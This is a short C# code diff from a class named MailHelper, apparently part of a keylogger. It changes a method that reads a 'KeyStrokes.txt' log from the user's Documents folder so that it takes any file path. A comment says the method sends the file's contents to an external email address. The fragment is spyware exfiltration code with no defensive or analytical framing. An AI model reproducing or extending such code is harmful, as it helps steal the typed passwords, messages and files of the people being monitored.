@@ -11,11 +11,11 @@ namespace Helper
 {
     public class MailHelper
     {
-        public static void SendNewMessage()
+        public static void SendNewMessage(string path)
         {
             //send the contents of the text file to an external email address.
             String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            string filePath = folderName + @"\KeyStrokes.txt";
+            string filePath = folderName + path;
             String logContents = File.ReadAllText(filePath);
             string emailBody = "";
 
